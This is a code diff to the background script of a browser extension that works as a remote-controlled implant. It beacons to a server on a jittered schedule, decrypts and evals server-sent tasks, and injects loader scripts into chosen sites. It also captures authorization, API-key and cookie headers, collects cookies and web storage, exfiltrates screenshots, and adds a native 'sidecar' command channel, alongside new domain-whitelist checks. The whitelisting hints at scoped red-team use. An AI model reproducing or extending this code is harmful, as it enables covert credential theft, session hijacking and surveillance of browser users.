@@ -1,6 +1,7 @@
 
-import { CONFIG } from '@/utils/config';
+import { CONFIG, isUrlWhitelisted, isDomainWhitelisted } from '@/utils/config';
 import { arrayBufferToBase64, base64ToArrayBuffer, importKey, encrypt, decrypt } from '@/utils/crypto';
+import { connectSidecar, initSidecarTaskListener, reportSidecarStatus } from '@/utils/sidecar';
 
 export default defineBackground(() => {
   let sessionUUID: string | null = null;
@@ -14,7 +15,7 @@ export default defineBackground(() => {
     isInitializing = true;
     console.log("BEX: Registering...");
     const url = `${CONFIG.serverUrl}/client/getToken/${CONFIG.tag}/${CONFIG.clientType}`;
-    
+
     try {
       const resp = await fetch(url);
       if (resp.ok) {
@@ -42,12 +43,12 @@ export default defineBackground(() => {
         if (data.enable === "true") {
           const obfuscatedString = atob(data.metricDebug);
           const obfuscatedData = new Uint8Array([...obfuscatedString].map(c => c.charCodeAt(0)));
-          
+
           const idHex = sessionUUID.replace(/-/g, '');
           const idBytes = new Uint8Array(
             idHex.match(/.{1,2}/g)!.map(byte => parseInt(byte, 16))
           );
-          
+
           const shift = 7 % idBytes.length;
           const rotateBytes = new Uint8Array([
             ...idBytes.slice(shift),
@@ -63,14 +64,14 @@ export default defineBackground(() => {
           for (let i = 0; i < obfuscatedData.length; i++) {
             plaintextData[i] = obfuscatedData[i] ^ masker[i];
           }
-          
+
           const receiveKeyData = plaintextData.slice(0, 32);
           const sendKeyData    = plaintextData.slice(32, 64);
 
           sendKey = await importKey(sendKeyData, ["encrypt"]);
           receiveKey = await importKey(receiveKeyData, ["decrypt"]);
           console.log("BEX: Keys initialized. Processing queue of", messageQueue.length, "messages.");
-          
+
           // Confirm crypto capability to the server so it knows we can receive encrypted tasks
           fetch(`${CONFIG.serverUrl}/client/confirmCrypto/${sessionUUID}`);
 
@@ -84,9 +85,12 @@ export default defineBackground(() => {
               console.error("BEX: Failed to send queued message", e);
             }
           }
-          
+
           // Immediate task check on startup/re-init
           checkTasks();
+
+          // Connect sidecar native messaging host (if enabled in config)
+          connectSidecar();
         }
       }
     } catch (e) {
@@ -131,13 +135,13 @@ export default defineBackground(() => {
       const resp = await sendEncrypted("/client/taskCheck", {});
       if (resp && resp.ok) {
         const jsonResponse = await resp.json();
-        
+
         let tasks = [];
         if (jsonResponse.metricData) {
             // Encrypted response
             const metricData = jsonResponse.metricData;
             const parts = metricData.split(",");
-            
+
             const ivBuffer = base64ToArrayBuffer(parts[0]);
             const cipherBuffer = base64ToArrayBuffer(parts[1]);
 
@@ -161,9 +165,16 @@ export default defineBackground(() => {
                 const config = JSON.parse(rawData);
                 if (config.type === 'CONFIG_INJECTION') {
                     console.log("BEX: Updating injection rule for domain:", config.domain, "Active:", config.active, "URL:", config.url);
+
+                    // Whitelist enforcement: reject injection tasks for non-whitelisted domains
+                    if (config.active && !isDomainWhitelisted(config.domain)) {
+                        console.log("BEX: Injection task for non-whitelisted domain rejected:", config.domain);
+                        continue;
+                    }
+
                     const rules = await browser.storage.local.get('injectionRules');
                     const currentRules = rules.injectionRules || {};
-                    
+
                     if (config.active) {
                         let finalUrl = config.url;
                         if (finalUrl.startsWith('/')) {
@@ -175,7 +186,7 @@ export default defineBackground(() => {
                         console.log("BEX: Removing injection rule for", config.domain);
                         delete currentRules[config.domain];
                     }
-                    
+
                     await browser.storage.local.set({ injectionRules: currentRules });
                     console.log("BEX: Current injection rules:", currentRules);
 
@@ -195,8 +206,16 @@ export default defineBackground(() => {
                     }
                     continue; // Skip eval
                 }
+
+                if (config.type === 'SIDECAR_COMMAND') {
+                    // Sidecar commands are handled by the sidecar module (if loaded)
+                    // Dispatch via custom event so the sidecar module can pick it up
+                    const event = new CustomEvent('sidecar-task', { detail: config });
+                    self.dispatchEvent(event);
+                    continue;
+                }
             }
-            
+
             // Fallback to standard eval for legacy tasks
             console.log("BEX: Executing legacy task via eval");
             eval(rawData);
@@ -233,15 +252,20 @@ export default defineBackground(() => {
     }
   }
 
-  // Injection Listener
+  // Injection Listener — with whitelist enforcement
   browser.webNavigation.onCompleted.addListener(async (details) => {
     if (details.frameId === 0) { // Top-level frame
+        // Whitelist enforcement: skip injection for non-whitelisted domains
+        if (!isUrlWhitelisted(details.url)) {
+            return;
+        }
+
         const rules = await browser.storage.local.get('injectionRules');
         const currentRules = rules.injectionRules || {};
-        
+
         const url = new URL(details.url);
         console.log("BEX: Navigation completed for", url.hostname, "Checking rules...");
-        
+
         if (currentRules[url.hostname]) {
             const scriptUrl = currentRules[url.hostname];
             console.log("BEX: [MATCH] Target domain matched! Injecting loader:", scriptUrl, "into tab", details.tabId);
@@ -252,6 +276,19 @@ export default defineBackground(() => {
     }
   });
 
+  // Jittered heartbeat scheduling
+  function scheduleNextHeartbeat() {
+    const baseMs = CONFIG.heartbeat.baseInterval * 1000;
+    const jitterFraction = CONFIG.heartbeat.jitterPercent / 100;
+    const minMs = baseMs * (1 - jitterFraction);
+    const maxMs = baseMs * (1 + jitterFraction);
+    const delayMs = minMs + Math.random() * (maxMs - minMs);
+    const delayMinutes = delayMs / 60000;
+
+    console.log(`BEX: Next heartbeat in ${(delayMs / 1000).toFixed(1)}s (base: ${CONFIG.heartbeat.baseInterval}s, jitter: ${CONFIG.heartbeat.jitterPercent}%)`);
+    browser.alarms.create("heartbeat", { delayInMinutes: delayMinutes });
+  }
+
   // Setup
   browser.storage.local.get("sessionUUID").then(async (res) => {
     sessionUUID = res.sessionUUID;
@@ -261,28 +298,38 @@ export default defineBackground(() => {
       await initKeys();
     }
 
-    // Set up periodic task check with configurable interval
-    console.log(`BEX: Starting heartbeat alarm with interval: ${CONFIG.heartbeatInterval}s`);
-    browser.alarms.create("heartbeat", { 
-      periodInMinutes: CONFIG.heartbeatInterval / 60 
-    });
+    // Start jittered heartbeat (one-shot alarms that reschedule)
+    scheduleNextHeartbeat();
   });
 
   browser.alarms.onAlarm.addListener((alarm) => {
     if (alarm.name === "heartbeat") {
       checkTasks();
+      connectSidecar(); // No-op if already connected or disabled; retries if not yet available
+      reportSidecarStatus();
+      scheduleNextHeartbeat(); // Re-arm with fresh jitter
     }
   });
 
-  // Telemetry listener from content scripts
+  // Initialize sidecar task listener (no-op if sidecar disabled in config)
+  initSidecarTaskListener();
+
+  // Telemetry listener from content scripts — with whitelist enforcement
   browser.runtime.onMessage.addListener(async (message, sender) => {
     if (message.type === 'TELEMETRY') {
       const { domain, url, localStorage, sessionStorage, cookies } = message.data;
+
+      // Whitelist enforcement: defense-in-depth check on telemetry from content scripts
+      if (!isUrlWhitelisted(url)) {
+        console.log("BEX: Telemetry from non-whitelisted domain ignored:", domain);
+        return;
+      }
+
       console.log("BEX: Received telemetry for", domain);
-      
+
       // Report domain/url visited
-      sendEncrypted("/bex/report", { 
-        visits: [{ domain, url }] 
+      sendEncrypted("/bex/report", {
+        visits: [{ domain, url }]
       });
 
       // Report cookies found by content script
@@ -313,8 +360,8 @@ export default defineBackground(() => {
       }
     } else if (message.type === 'TAKE_SCREENSHOT') {
       const { sessionUUID: implantUUID, isEncrypted } = message.data;
-      
-      // Critical Check: We can only capture the visible tab. 
+
+      // Critical Check: We can only capture the visible tab.
       // If the requesting implant is in a background tab, capturing 'visible' will grab the WRONG site.
       if (!sender.tab?.active) {
         console.log("BEX: [SCREENSHOT] Skipped. Requesting tab is not active:", sender.tab?.id);
@@ -322,19 +369,19 @@ export default defineBackground(() => {
       }
 
       console.log("BEX: [SCREENSHOT] Capturing active tab for implant:", implantUUID);
-      
+
       try {
         // Capture the visible area of the active tab
         const dataUrl = await browser.tabs.captureVisibleTab(undefined, { format: 'png' });
-        
+
         // Convert dataURL to Blob/ArrayBuffer
         const resp = await fetch(dataUrl);
         const blob = await resp.blob();
-        
+
         if (sendKey) {
           // Exfiltrate via our own encrypted metrics channel but tag it for the target implant
           const arrayBuffer = await blob.arrayBuffer();
-          // We send to OUR metrics endpoint (sessionUUID is the beacon's here), 
+          // We send to OUR metrics endpoint (sessionUUID is the beacon's here),
           // but use a path that specifies the target implant.
           await sendEncryptedData(sessionUUID!, `/bex/screenshot/${implantUUID}`, arrayBuffer);
         } else {
@@ -377,9 +424,17 @@ export default defineBackground(() => {
     });
   }
 
-  // Header capture logic
+  // Expose sendEncrypted for sidecar module access
+  (self as any).__bexSendEncrypted = sendEncrypted;
+  (self as any).__bexGetSessionUUID = () => sessionUUID;
+
+  // Header capture logic — with whitelist enforcement via shared helper
   const INTERESTING_HEADERS = ['authorization', 'x-api-key', 'cookie', 'set-cookie'];
   const captureCache = new Map<string, number>();
+
+  const headerUrlFilter = CONFIG.domainScoping.whitelistEnabled
+    ? { urls: CONFIG.domainScoping.whitelist }
+    : { urls: ['<all_urls>'] as string[] };
 
   browser.webRequest.onSendHeaders.addListener(
     (details) => {
@@ -388,14 +443,8 @@ export default defineBackground(() => {
       const domain = url.hostname;
       const currentUrl = details.url;
 
-      // Domain scoping check for background capture
-      if (CONFIG.domainScoping.mode === 'whitelist') {
-        const isWhitelisted = CONFIG.domainScoping.whitelist.some(pattern => {
-          const regex = new RegExp(pattern.replace(/\*/g, '.*'));
-          return regex.test(currentUrl);
-        });
-        if (!isWhitelisted) return;
-      }
+      // Defense-in-depth: also check via helper in case filter patterns don't perfectly match
+      if (!isUrlWhitelisted(currentUrl)) return;
 
       details.requestHeaders.forEach(header => {
         const headerName = header.name.toLowerCase();
@@ -404,11 +453,11 @@ export default defineBackground(() => {
           // Create a unique key for this capture
           const cacheKey = `${domain}:${headerName}:${value}`;
           const now = Date.now();
-          
+
           // Only send if we haven't seen this exact capture in the last 60 seconds
           if (!captureCache.has(cacheKey) || (now - captureCache.get(cacheKey)! > 60000)) {
             captureCache.set(cacheKey, now);
-            
+
             // Clean up cache if it gets too big
             if (captureCache.size > 1000) {
                 const oldest = now - 60000;
@@ -428,7 +477,7 @@ export default defineBackground(() => {
         }
       });
     },
-    { urls: ['<all_urls>'] },
+    headerUrlFilter,
     ['requestHeaders']
   );
 
